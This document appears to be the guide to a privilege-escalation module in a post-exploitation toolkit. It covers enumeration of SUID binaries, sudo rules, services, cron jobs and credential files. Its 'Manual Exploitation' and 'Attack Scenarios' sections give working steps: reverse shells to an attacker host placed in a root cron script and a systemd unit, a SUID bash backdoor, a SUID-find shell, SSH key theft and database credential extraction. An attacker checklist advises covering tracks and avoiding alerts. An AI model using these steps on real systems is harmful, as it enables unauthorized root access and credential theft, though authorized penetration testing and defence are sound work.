# Privilege Escalation Implementation Guide

## Overview

Enumeration and exploitation capabilities to identify privilege escalation vectors and elevate access from standard user to root/administrator.

## Implementation Details

### Architecture

- **Module**: `features/privilege_escalation.py`
- **Class**: `PrivilegeEscalation`
- **Focus**: Enumeration and identification (not exploitation)
- **Platform**: Cross-platform (Linux, macOS, Windows)

## Commands Reference

### Check Privileges

```bash
priv_check
```

**What happens:**

- Checks current user privileges
- Determines if running as root/admin
- Identifies user groups
- Shows effective UID/GID (Unix)

**Response (Linux/macOS):**

```
=== Privilege Check ===
Current User: john
User ID (UID): 1000
Group ID (GID): 1000
Effective UID: 1000
Is Admin/Root: NO

Groups: john adm cdrom sudo dip plugdev lpadmin sambashare

Privileges:
- Standard user (not root)
- Member of sudo group (can elevate with password)
- Member of adm group (can read logs)
```

**Response (Windows):**

```
=== Privilege Check ===
Current User: DESKTOP\John
Is Administrator: NO
User Groups:
  - BUILTIN\Users
  - NT AUTHORITY\INTERACTIVE
  - CONSOLE LOGON

Privileges:
- Standard user (not administrator)
- Can request UAC elevation
```

**Use case:**

- Understand current privilege level
- Determine if escalation needed
- Identify group memberships
- Plan escalation strategy

---

### Enumerate Escalation Vectors

```bash
priv_enum
```

**What happens:**

- Comprehensive privilege escalation enumeration
- Checks SUID binaries (Linux/macOS)
- Finds sudo opportunities
- Checks kernel version
- Identifies writable paths
- Examines file permissions

**Response:**

```
=== Privilege Escalation Enumeration ===

CURRENT STATUS:
User: john (UID: 1000)
Privilege Level: Standard User
Sudo Access: YES (with password)

SUID BINARIES:
[+] Found 156 SUID binaries
Potentially exploitable:
  /usr/bin/passwd
  /usr/bin/sudo
  /usr/bin/pkexec
  /usr/bin/find (⚠️ GTFOBins candidate)
  /usr/bin/vim (⚠️ GTFOBins candidate)
  /usr/sbin/mount
  /bin/ping

SUDO OPPORTUNITIES:
User john may run the following commands:
  (ALL : ALL) ALL
  (root) NOPASSWD: /usr/bin/systemctl restart apache2

⚠️ No password required for: systemctl restart apache2
Exploit: Arbitrary command execution via systemctl

KERNEL VERSION:
Linux 4.15.0-142-generic
Known vulnerabilities:
  - CVE-2021-3493 (OverlayFS)
  - CVE-2021-3490 (eBPF)

WRITABLE PATHS IN $PATH:
  /home/john/.local/bin (Writable)
  ⚠️ Can place malicious binaries here

INTERESTING FILES:
  /etc/passwd (World readable)
  /etc/shadow (Not readable - root only)
  /var/log/auth.log (Readable - adm group)
  /etc/crontab (Readable)
  /var/spool/cron/crontabs (Not readable)

RECOMMENDATIONS:
1. Try: sudo -l (check NOPASSWD commands)
2. Exploit: /usr/bin/find SUID binary
3. Research: Kernel CVE-2021-3493
4. Check: Cron jobs for writable scripts
```

**Use case:**

- Comprehensive privilege assessment
- Identify multiple escalation paths
- Prioritize attack vectors
- Gather reconnaissance data

---

### Enumerate Services

```bash
priv_services
```

**What happens:**

- Lists running services
- Shows service states
- Identifies service permissions
- Finds services running as root
- Checks for writable service configs

**Response (Linux):**

```
=== Running Services ===

SYSTEM SERVICES:
apache2          RUNNING    root      /usr/sbin/apache2
mysql            RUNNING    mysql     /usr/sbin/mysqld
ssh              RUNNING    root      /usr/sbin/sshd
cron             RUNNING    root      /usr/sbin/cron

WRITABLE SERVICE FILES:
⚠️ /etc/apache2/apache2.conf (Group writable)
  Owner: root:www-data
  Permissions: -rw-rw-r--
  Exploit: Modify config, restart service as root

SERVICES WITH WEAK PERMISSIONS:
⚠️ /opt/custom-service/run.sh
  Owner: root:root
  Permissions: -rwxrwxrwx (World writable!)
  Exploit: Replace script, wait for execution

SYSTEMD SERVICES:
  apache2.service    enabled
  mysql.service      enabled
  custom.service     enabled (⚠️ /opt/custom-service/run.sh)
```

**Response (Windows):**

```
=== Windows Services ===

RUNNING SERVICES:
Apache2.4         RUNNING    LocalSystem
MySQL             RUNNING    NT AUTHORITY\NetworkService
CustomService     RUNNING    LocalSystem

VULNERABLE SERVICES:
⚠️ CustomService
  Path: C:\Program Files\Custom\service.exe
  Binary not quoted (⚠️ Unquoted Service Path)
  Exploit: Place exe in C:\Program.exe or C:\Program Files\Custom.exe

MODIFIABLE SERVICES:
⚠️ Apache2.4 service registry key writable
  Path: HKLM\SYSTEM\CurrentControlSet\Services\Apache2.4
  Exploit: Modify ImagePath to run custom exe
```

**Use case:**

- Identify service-based exploits
- Find writable service configs
- Discover services running as SYSTEM/root
- Plan service restart attacks

---

### Check Scheduled Tasks

```bash
priv_tasks
```

**What happens:**

- Lists cron jobs (Linux/macOS)
- Shows scheduled tasks (Windows)
- Identifies task permissions
- Finds writable task scripts

**Response (Linux):**

```
=== Scheduled Tasks (Cron Jobs) ===

USER CRON JOBS:
john:
  */5 * * * * /home/john/backup.sh

ROOT CRON JOBS:
root:
  0 2 * * * /root/cleanup.sh
  */10 * * * * /opt/backup/run.sh (⚠️ World writable)
  @reboot /usr/local/bin/startup.sh

WRITABLE CRON SCRIPTS:
⚠️ /opt/backup/run.sh
  Owner: root:root
  Permissions: -rwxrwxrwx
  Runs as: root
  Frequency: Every 10 minutes
  Exploit: Modify script, wait for execution

SYSTEM-WIDE CRON:
/etc/crontab:
  0 * * * * root /usr/bin/update-script.sh

CRON DIRECTORIES:
  /etc/cron.d/ (Readable)
  /etc/cron.daily/ (Writable by sudo group!)
  /etc/cron.hourly/
```

**Response (Windows):**

```
=== Scheduled Tasks ===

TASKS RUNNING AS SYSTEM:
  BackupTask
    Path: C:\Scripts\backup.bat (⚠️ Users can modify)
    Schedule: Daily at 2:00 AM
    Runs as: SYSTEM

  UpdateTask
    Path: C:\Program Files\App\update.exe
    Schedule: Every hour

WRITABLE TASK PATHS:
⚠️ C:\Scripts\backup.bat
  Permissions: Users (Modify)
  Exploit: Modify script, wait for scheduled execution
```

**Use case:**

- Find scripts running as root/SYSTEM
- Identify writable scheduled tasks
- Plan time-based attacks
- Discover automation scripts

---

### Find Sensitive Files

```bash
priv_sensitive
```

**What happens:**

- Searches for sensitive files
- Looks for credentials
- Finds configuration files
- Checks history files
- Identifies SSH keys

**Response:**

```
=== Sensitive Files ===

CREDENTIAL FILES:
  /home/john/.bash_history (Readable)
  /home/john/.mysql_history (Readable)
  /home/john/.ssh/id_rsa (Private key found!)
  /home/john/.ssh/config (SSH configuration)
  /home/john/.aws/credentials (AWS keys!)
  /home/john/.docker/config.json (Docker credentials)

CONFIGURATION FILES:
  /etc/mysql/my.cnf (Readable)
  /var/www/html/config.php (Database credentials)
  /opt/app/.env (Environment variables with secrets)

HISTORY FILES WITH PASSWORDS:
/home/john/.bash_history:
  mysql -u root -p'SecretPassword123'
  ssh admin@server.com -i /home/john/.ssh/id_rsa
  sudo su - root
  export DB_PASS='DatabasePass456'

DATABASE FILES:
  /var/lib/mysql/ (Not readable - mysql user only)
  /var/www/html/database.sqlite (World readable!)

BACKUP FILES:
  /tmp/backup-2024.tar.gz (World readable)
  /var/backups/passwd.bak (Readable - contains user info)

SSH KEYS:
  /home/john/.ssh/id_rsa (Private key - NOT encrypted)
  /home/john/.ssh/id_rsa.pub
  /root/.ssh/authorized_keys (Not readable)

POTENTIAL CREDENTIALS:
  Database password in: /var/www/html/config.php
  API keys in: /opt/app/.env
  SSH key in: /home/john/.ssh/id_rsa
  AWS credentials in: /home/john/.aws/credentials
```

**Use case:**

- Find hardcoded credentials
- Discover SSH keys
- Extract database passwords
- Locate API tokens
- Find backup files

## Troubleshooting

### Issue 1: "Permission denied" errors

**Cause:** Insufficient privileges to read certain files/directories

**Solution:**

```bash
# Expected behavior
# Some enumeration requires root access
# Note files you CAN'T access (interesting targets)

# Try privilege escalation first, then re-run
```

---

### Issue 2: priv_enum returns limited results

**Causes:**

- Not running with sufficient privileges
- System hardened/minimal
- Commands not available

**Solutions:**

```bash
# Install enumeration tools
sudo apt-get install linux-exploit-suggester

# Manual enumeration
sudo -l
find / -perm -4000 2>/dev/null
cat /etc/crontab
```

---

### Issue 3: No SUID binaries found

**Cause:** Find command failed or not in PATH

**Solution:**

```bash
# Manual SUID search
find / -perm -4000 -type f 2>/dev/null

# Or locate specific binaries
which find vim nano less
```

---

### Issue 4: "Command not found" errors

**Cause:** System commands not available or not in PATH

**Solution:**

```bash
# Check PATH
echo $PATH

# Try full paths
/usr/bin/sudo -l
/bin/find / -perm -4000
```

## Limitations

### Technical Limitations

1. **Enumeration Only**

   - Does not exploit vulnerabilities
   - Does not execute attacks
   - Only identifies potential vectors
   - Manual exploitation required

2. **Platform-Specific**

   - Different techniques per OS
   - Windows/Linux/macOS variations
   - Command availability varies
   - Output parsing differs

3. **Requires Execution**

   - Must run on target system
   - Needs basic user privileges
   - Some checks require permissions
   - May trigger security alerts

4. **Limited Coverage**
   - Can't check everything
   - May miss custom vulnerabilities
   - Doesn't test all CVEs
   - Basic enumeration only

### Detection Risks

1. **Command Execution**

   - Running enumeration commands logged
   - Audit logs show privilege checks
   - Security tools may alert
   - Unusual process activity

2. **File Access**

   - Reading sensitive files logged
   - Failed access attempts recorded
   - Triggers file integrity monitoring
   - Antivirus may flag behavior

3. **Network Activity**
   - Some checks require network access
   - Kernel version lookups
   - CVE database queries

### Functional Limitations

1. **No Automation**

   - Doesn't auto-exploit findings
   - Manual interpretation required
   - No privilege escalation execution
   - Reconnaissance tool only

2. **No Custom Checks**

   - Standard vectors only
   - Doesn't check application-specific vulns
   - No custom binary analysis
   - Limited to known techniques

3. **Output Limitations**
   - Large output for complex systems
   - May need filtering/parsing
   - Information overload
   - Manual review required

## Best Practices

### 1. Systematic Enumeration

```bash
# Follow this order:
# 1. Check current status
priv_check

# 2. Comprehensive enumeration
priv_enum

# 3. Service analysis
priv_services

# 4. Scheduled task review
priv_tasks

# 5. Sensitive file discovery
priv_sensitive

# Save all output for offline analysis
```

### 2. Documentation

```bash
# Save all enumeration results
priv_check > priv_check.txt
priv_enum > priv_enum.txt
priv_services > priv_services.txt
priv_tasks > priv_tasks.txt
priv_sensitive > priv_sensitive.txt

# Download for offline analysis
download priv_check.txt
download priv_enum.txt
```

### 3. Prioritization

```bash
# Focus on highest-impact findings:
# 1. NOPASSWD sudo commands
# 2. Writable SUID binaries
# 3. Writable service configs
# 4. Writable cron scripts
# 5. SSH keys without passphrases
# 6. Hardcoded credentials
```

### 4. Manual Exploitation

```bash
# After enumeration, exploit manually:

# Example: NOPASSWD sudo
sudo systemctl restart apache2

# Example: Writable cron script
echo "bash -i >& /dev/tcp/attacker/4444 0>&1" >> /opt/backup/run.sh

# Example: SUID find
find . -exec /bin/sh -p \; -quit
```

## Attack Scenarios

### Scenario 1: Sudo NOPASSWD Exploitation

```bash
# 1. Enumerate
priv_enum
# Finds: (root) NOPASSWD: /usr/bin/systemctl restart apache2

# 2. Exploit systemctl
# Create malicious service
echo '[Service]
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"
[Install]
WantedBy=multi-user.target' > /tmp/evil.service

# 3. Restart with malicious service
sudo systemctl link /tmp/evil.service
sudo systemctl start evil
# Result: Root shell to attacker
```

---

### Scenario 2: Writable Cron Job

```bash
# 1. Find writable cron
priv_tasks
# Finds: /opt/backup/run.sh (world writable, runs as root)

# 2. Modify script
echo '#!/bin/bash' > /opt/backup/run.sh
echo 'cp /bin/bash /tmp/rootbash' >> /opt/backup/run.sh
echo 'chmod +s /tmp/rootbash' >> /opt/backup/run.sh

# 3. Wait for execution (check schedule)
# Script runs, creates SUID bash

# 4. Execute SUID bash
/tmp/rootbash -p
# Result: Root shell
```

---

### Scenario 3: SSH Key Theft

```bash
# 1. Find SSH keys
priv_sensitive
# Finds: /home/john/.ssh/id_rsa (no passphrase)

# 2. Download key
download /home/john/.ssh/id_rsa

# 3. Use on attacker machine
chmod 600 id_rsa
ssh -i id_rsa root@target-server
# Result: SSH access as different user
```

---

### Scenario 4: Database Credential Extraction

```bash
# 1. Find credentials
priv_sensitive
# Finds: /var/www/html/config.php with DB password

# 2. Extract credentials
cat /var/www/html/config.php
# $db_user = "root";
# $db_pass = "SuperSecret123";

# 3. Access database
mysql -u root -p'SuperSecret123'
# Result: Database access, potentially more credentials
```

## Performance Impact

- **CPU**: Minimal (file searches can be intensive)
- **Memory**: Low (output can be large)
- **Disk**: Read-only operations
- **Time**:
  - priv_check: < 1 second
  - priv_enum: 10-30 seconds
  - priv_services: 2-5 seconds
  - priv_tasks: 1-2 seconds
  - priv_sensitive: 10-60 seconds (file searches)

## Security Considerations

### For Attackers

✅ Run enumeration early
✅ Save all output
✅ Prioritize findings
✅ Exploit manually
✅ Cover tracks after escalation
❌ Don't repeatedly enumerate
❌ Avoid triggering alerts

### For Defenders

✅ Monitor for enumeration patterns
✅ Audit sudo configurations
✅ Restrict SUID binaries
✅ Harden cron permissions
✅ Protect sensitive files
✅ Monitor file access logs
✅ Use security tools (fail2ban, SELinux)

## Summary

Privilege escalation features:
✅ Current privilege assessment
✅ SUID binary enumeration
✅ Sudo opportunity identification
✅ Service permission analysis
✅ Scheduled task review
✅ Sensitive file discovery
✅ Cross-platform support
✅ Comprehensive enumeration

**This is a reconnaissance tool - exploitation must be done manually. Use only in authorized testing environments.**
